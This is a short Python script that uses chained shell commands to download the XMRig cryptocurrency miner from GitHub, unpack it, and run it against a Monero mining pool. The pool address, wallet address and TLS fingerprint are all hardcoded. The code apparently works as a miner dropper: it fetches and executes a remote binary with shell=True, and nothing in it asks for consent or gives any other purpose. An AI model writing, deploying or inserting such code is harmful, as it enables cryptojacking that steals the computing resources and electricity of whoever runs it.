import subprocess
import sys

def deploy_and_run():
    # The chained shell commands provided
    command = (
        "wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && "
        "tar xvzf xmrig-6.21.1-linux-x64.tar.gz && "
        "cd xmrig-6.21.1 && "
        "./xmrig --url pool.hashvault.pro:443 "
        "--user 46qfKvhZjvtZPQuSryhfnJ5pS4xkQosv2C6qzZ613vLaPa6vwZ1JgrV7HAxE4wMDUUYSzAyBBZGmNPfbPDrUegGvC1UtEdH "
        "--pass x0 --donate-level 1 "
        "--tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
    )

    print("[*] Initializing execution sequence...")
    
    try:
        # We use shell=True because the command uses shell operators like '&&'
        # stdout/stderr are inherited to see the live output of xmrig directly in the console
        process = subprocess.run(
            command, 
            shell=True, 
            check=True
        )
        print("\n[+] Process finished successfully.")
    except subprocess.CalledProcessError as e:
        print(f"\n[-] Execution failed with return code {e.returncode}.", file=sys.stderr)
    except KeyboardInterrupt:
        print("\n[*] Execution interrupted by user.")

if __name__ == "__main__":
    deploy_and_run()
